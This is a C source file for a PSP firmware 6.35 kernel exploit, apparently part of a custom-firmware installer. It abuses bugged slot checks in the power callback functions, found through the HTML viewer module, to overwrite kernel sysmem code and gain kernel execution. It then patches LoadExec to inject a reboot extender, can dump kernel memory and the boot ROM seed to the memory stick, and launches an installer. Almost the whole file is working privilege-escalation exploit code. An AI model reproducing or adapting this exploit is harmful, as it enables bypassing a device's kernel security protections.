#include <pspkernel.h>
#include <pspdebug.h>
#include <pspctrl.h>
#include <pspsdk.h>
#include <pspiofilemgr.h>
#include <psputility.h>
#include <psputility_htmlviewer.h>
#include <psploadexec.h>
#include <psputils.h>
#include <psputilsforkernel.h>
#include <psppower.h>
#include <string.h>
#include "systemctrl.h"
#include "rebootex.h"
#include "utils.h"
#include "printk.h"

PSP_MODULE_INFO("635kernel", PSP_MODULE_USER, 1, 0);
PSP_HEAP_SIZE_KB(0);

//installer path
char installerpath[256];

//psp model
int model = 0;

int dump_kmem = 0;

//load reboot function
int (* LoadReboot)(void * arg1, unsigned int arg2, void * arg3, unsigned int arg4) = NULL;

//register callback function - slot bugged. :D
int (* _scePowerRegisterCallback)(unsigned int slot, int cbid) = NULL;

//unregister callback function - its slotcheck is bugged too. ;)
int (* _scePowerUnregisterCallback)(unsigned int slot) = NULL;

//load reboot wrapper
int _LoadReboot(void * arg1, unsigned int arg2, void * arg3, unsigned int arg4)
{
	//copy reboot extender
	memcpy((char *)0x88FC0000, rebootex, size_rebootex);

	//reset reboot flags
	memset((char *)0x88FB0000, 0, 0x100);

	//store psp model
	_sw(model, 0x88FB0000);

	//store rebootex length
	_sw(size_rebootex, 0x88FB0004);

	//copy installer path
	memcpy((char *)0x88FB0100, installerpath, sizeof(installerpath));

	//forward
	return LoadReboot(arg1, arg2, arg3, arg4);
}

//safe syscall wrapper for kernel_permission_call - this lets us return safely!
int kernelSyscall(void);
u32 get_power_address(int cbid);

// restore offset 0x9650~0x9730 in sysmem
void restore_sysmem(void)
{
	u32 address, data_address;

	address = 0x88000000 + 0xA110;
	data_address = 0x88013B40;

#define INTR(intr) \
	_sw((intr), address); address +=4;
#define INTR_HIGH(intr) \
	_sw((intr&0xFFFF0000) + ((((intr) + (data_address >> 16)) & 0xFFFF)), address); address +=4;
#define INTR_LOW(intr) \
	_sw((intr&0xFFFF0000) + (((intr) + (data_address & 0xFFFF)) & 0xFFFF), address); address +=4;

	// SysMemForKernel_E82F9E1B:
	INTR_HIGH(0x3C050000);
	INTR_LOW(0x8CA409F8);
	INTR(0x3C038002);
	INTR(0x34620001);
	INTR(0x03E00008);
	INTR(0x0004100A);

	// SysMemForKernel_61BFD5D4:
	INTR_HIGH(0x3C050000);
	INTR_LOW(0x8CA609F8);
	INTR(0x00C41024);
	INTR(0x03E00008);
	INTR(0xACA209F8);

	// SysMemForKernel_458A70B5
	INTR_HIGH(0x3C040000);
	INTR(0x03E00008);
	INTR_LOW(0x8C8209FC);

	// SysMemForKernel_E0A74F2D
	INTR_HIGH(0x3C030000);
	INTR(0x00001021);
	INTR(0x03E00008);
	INTR_LOW(0xAC6404A4);

	// SysMemForKernel_A51E2C33
	INTR_HIGH(0x3C050000);
	INTR_LOW(0x8CA304A4);
	INTR(0x27BDFFF0);
	INTR(0x3C058002);
	INTR(0xAFBF0000);
	INTR(0x10600003);
	INTR(0x34A20001);
	INTR(0x0060F809);
	INTR(0x00000000);
	INTR(0x8FBF0000);
	INTR(0x03E00008);
	INTR(0x27BD0010);

	// SysMemForKernel_25A760F0:
	INTR_HIGH(0x3C050000);
	INTR_LOW(0x8CA604A8);
	INTR(0x3C028002);
	INTR(0x14C00003);
	INTR(0x34430001);
	INTR_LOW(0xACA404A8);
	INTR(0x00001821);
	INTR(0x03E00008);
	INTR(0x00601021);

	// SysMemForKernel_288B090A:
	INTR(0x27BDFFF0);
	INTR(0xAFB00000);
	INTR_HIGH(0x3C100000);
	INTR(0x3C038002);
	INTR_LOW(0x8E0604A8);
	INTR(0xAFBF0004);
	INTR(0x00064027);
	INTR(0x0008102B);
	INTR(0x0006482B);
	INTR(0x01224024);
	INTR(0x15000006);
	INTR(0x34670001);
	INTR(0x8FBF0004);
	INTR(0x8FB00000);
	INTR(0x00E01021);
	INTR(0x03E00008);
	INTR(0x27BD0010);

#undef INTR
#undef HIGH
#undef LOW
}

//our 6.35 kernel permission call
int kernel_permission_call(void)
{
	//cache invalidation functions
	void (* _sceKernelIcacheInvalidateAll)(void) = (void *)0x88000E98;
	void (* _sceKernelDcacheWritebackInvalidateAll)(void) = (void *)0x88000744;

	restore_sysmem();

	//sync cache
	_sceKernelIcacheInvalidateAll();
	_sceKernelDcacheWritebackInvalidateAll();

	//LoadCoreForKernel_EF8A0BEA
	SceModule2 * (* _sceKernelFindModuleByName)(const char * libname) = (void *)0x88017000 + 0x72D8;

	//find LoadExec module
	SceModule2 * loadexec = _sceKernelFindModuleByName("sceLoadExec");

	//SysMemForKernel_458A70B5
	int (* _sceKernelGetModel)(void) = (void *)0x88000000 + 0xA13C;

	//save psp model
	model = _sceKernelGetModel();

	//loadexec patches
	unsigned int offsets[2];

	//psp N1000
	if(model == 4)
	{
		offsets[0] = 0x2F90;
		offsets[1] = 0x2FDC;
	}

	//psp 1000-4000
	else
	{
		offsets[0] = 0x2D44;
		offsets[1] = 0x2D90;
	}

	//replace LoadReboot function
	_sw(MAKE_CALL(_LoadReboot), loadexec->text_addr + offsets[0]);

	//patch Rebootex position to 0x88FC0000
	_sw(0x3C0188FC, loadexec->text_addr + offsets[1]); // lui $at, 0x88FC

	//sync cache
	_sceKernelIcacheInvalidateAll();
	_sceKernelDcacheWritebackInvalidateAll();

	//save LoadReboot function
	LoadReboot = (void*)loadexec->text_addr;

	if (dump_kmem) {
		memcpy((void*)0x08A00000, (void*)0x88000000, 0x400000);
		memcpy((void*)(0x08A00000+0x400000), (void*)0xBFC00200, 0x100);
	}

	//return success
	return 0xC01DB15D;
}

//hacked sysmem function (0xA230)
int SysMemUserForUser_D8DE5C1E(int arg1, int arg2, int (* callback)(void), int arg4, int branchkiller);

static u16 g_working_intr_prefix[] = {
	0x04A3, // bgezl $a1
	0x04A1, // bgez $a1
	0x04C0, // bltz $a2
	0x04C2, // bltzl $a2
	0x04D0, // bltzal $a2
	0x04D2, // bltzall $a2
	0x04E0, // bltz $a3
	0x04E2, // bltzl $a3
	0x04F0, // bltzal $a3
	0x04F2, // bltzall $a3
	0x0503, // bgezl $t0
	0x0501, // bgez $t0
};

// result = SysMemUserForUser_D8DE5C1E(0xC01DB15D, 0xC00DCAFE, kernelSyscall, 0x12345678, -1);
// a0 > 0
// a1 > 0
// a2 < 0(kernelSyscall)
// a3 < 0
// t0 > 0
int IsOneOfIntr(u32 intr)
{
	u16 prefix;
	int i;

	prefix = intr >> 16;

	for(i=0; i<NELEMS(g_working_intr_prefix); ++i) {
		if (g_working_intr_prefix[i] == prefix)
			return 1;
	}

	return 0; 
}

static int is_pspgo(void)
{
	// This call will always fail, but with a different error code depending on the model
	SceUID result = sceIoOpen("ef0:/", 1, 0777);

	// Check for "No such device" error
	return ((result == (int)0x80020321) ? 0 : 1);
}

static inline u32 get_power_slot_by_address(u32 address, u32 power_buf_address)
{
	if (address < power_buf_address)
		return (~(power_buf_address - address) + 1) >> 4;

	return (address - power_buf_address) >> 4;
}

// psp-go don't need this for it's always zero.
static void patch_power_arg(int cbid, u32 power_buf_address)
{
	int slot;

	while (1) {
		slot = 0x204>>4;
		_scePowerUnregisterCallback(slot);
		_scePowerRegisterCallback(slot, cbid);

		*(u32*)0x08900008 = 0xDEADBEEF;
		slot = get_power_slot_by_address(0x08900000, power_buf_address);
		_scePowerUnregisterCallback(slot);
		_scePowerRegisterCallback(slot, cbid);

		if (*((u32*)0x08900008) == 0) {
			printk("%s: power_arg noped\r\n", __func__);
			break;
		}

		printk("Retrying...\r\n");
		sceKernelDelayThread(1000000);
	}
}

#if 1
void freezeme(unsigned int color)
{
	while(1)
	{
		unsigned int *p = (unsigned int*) 0x04000000;
		while (p < (unsigned int*) 0x04400000) *p++ = color;
	}
}
#endif

int install_in_cfw(void)
{
	//installer load result
	int result = 0;

	//load installer module
	SceUID mod = sceKernelLoadModule(installerpath, 0, NULL);

	//installer loaded
	if (mod >= 0) {
		//start installer
		result = sceKernelStartModule(mod, strlen(installerpath) + 1, installerpath, NULL, NULL);
	}

	return 0;
}

//entry point
int main(int argc, char * argv[])
{
	//result
	int result = 0;
	u32 power_buf_address = 0;
	u32 fw_version;

	//puzzle installer path
	strcpy(installerpath, argv[0]);
	char * slash = strrchr(installerpath, '/');
	if (slash) strcpy(slash + 1, "installer.prx");

	//create empty callback
	int cbid = -1;

	printk_init("ms0:/launcher.txt");
	printk("Hello exploit\r\n");
	pspDebugScreenInit();

	fw_version = sceKernelDevkitVersion();

	if (fw_version != 0x06030510) {
		pspDebugScreenPrintf("Sorry. This program requires 6.35.\n");
		sceKernelDelayThread(5*1000000);
		goto exit;
	}

	if(sctrlHENGetVersion() >= 0) {
		install_in_cfw();

		return 0;
	}

	{
		SceCtrlData ctl;
		sceCtrlReadBufferPositive(&ctl, 1);

		if (ctl.Buttons & PSP_CTRL_LTRIGGER) {
			dump_kmem = 1;
			pspDebugScreenPrintf("Kernel memory will be dumped into ms0:/KMEM.BIN and ms0:/SEED.BIN\r\n");
		}
	}

	//create a fitting one
	while(!IsOneOfIntr((u32)cbid))
	{
		//sceKernelDeleteCallback(cbid);
		cbid = sceKernelCreateCallback("", NULL, NULL);
	}

	printk("Got a CBID: 0x%08X\r\n", cbid);

	//html parameter
	pspUtilityHtmlViewerParam param;
	memset(&param, 0, sizeof(param));
	param.base.size = sizeof(param);
	param.base.accessThread = 0x13;

	//load html module
	result = sceUtilityHtmlViewerInitStart(&param);

	//html module loaded
	if(result >= 0)
	{
		//wait for module
		sceKernelDelayThread(2000000);

		//partition 2 memory
		char * partition2 = (char *)0x08800000;

		//"sceVshHVUtility_Module" module
		char * sceVshVH = NULL;

		//local string copy
		//we need to compare this pointer in the scan...
		//as we are in the user partition too, we might find ourselves...
		//so we need to make sure we don't hit this pointer.
		const char * localVshVH = "sceVshHV";

		//find the module
		//Coldbird: it's at offset 0xBC70 in 6.31...
		for(sceVshVH = partition2; sceVshVH < (char *)0x0A000000; sceVshVH += 4)
		{
			//found module name
			if(strncmp(sceVshVH, localVshVH, 8) == 0 && sceVshVH != localVshVH) break;
		}

		//register callback function - slot bugged. :D
		_scePowerRegisterCallback = (void *)(sceVshVH - 552);

		//unregister callback function - its slotcheck is bugged too. ;)
		_scePowerUnregisterCallback = (void *)(sceVshVH - 616);

		printk("_scePowerRegisterCallback: 0x%08X\r\n", (u32)_scePowerRegisterCallback);
		printk("_scePowerUnregisterCallback: 0x%08X\r\n", (u32)_scePowerUnregisterCallback);

		//set k1 register to trigger slot bug
		pspSdkSetK1(0);

		//Davee $v1 trick, $v1 would leak the power_buf_address when called on an registered slot 0
		_scePowerRegisterCallback(0, cbid);
		power_buf_address = get_power_address(cbid);
		_scePowerUnregisterCallback(0);
		printk("power_buf_address 0x%08X\r\n", power_buf_address);

		if(!is_pspgo()) {
			patch_power_arg(cbid, power_buf_address);
		}

		//override sysmem function
		unsigned int smpos = 0xA110; for(; smpos < 0xA1F0; smpos += 16)
		{
			//calculate slot
			unsigned int slot = get_power_slot_by_address(((u32)0x88000000)+smpos, power_buf_address);

			//wipe memory with -1... else overriding fails.
			_scePowerUnregisterCallback(slot);

			//register dummy callback (override memory ^^)
			result = _scePowerRegisterCallback(slot, cbid);

			//patching error
			if(result) break;
		}

		//flush changes to memory
		sync_cache();

		//restoring instructions and patching loadexec
		unsigned int interrupts = pspSdkDisableInterrupts();
		result = SysMemUserForUser_D8DE5C1E(0xC01DB15D, 0xC00DCAFE, kernelSyscall, 0x12345678, -1);
		pspSdkEnableInterrupts(interrupts);

		if ( dump_kmem ) {
			SceUID fd;

			fd = sceIoOpen("ms0:/kmem.bin", PSP_O_WRONLY | PSP_O_CREAT | PSP_O_TRUNC, 0777);

			if (fd >= 0) {
				sceIoWrite(fd, (void*)0x08A00000, 0x400000);
				sceIoClose(fd);
			}

			fd = sceIoOpen("ms0:/seed.bin", PSP_O_WRONLY | PSP_O_CREAT | PSP_O_TRUNC, 0777);

			if (fd >= 0) {
				sceIoWrite(fd, (void*)(0x08A00000+0x400000), 0x100);
				sceIoClose(fd);
			}
		}

		printk("SysMemUserForUser_D8DE5C1E returns 0x%08X\r\n", result);
	}

exit:
	//trigger reboot
	sceKernelExitGame();

	//kill thread
	sceKernelExitDeleteThread(0);

	//return
	return 0;
}

//exit point
int module_stop(SceSize args, void * argp)
{
	//return
	return 0;
}
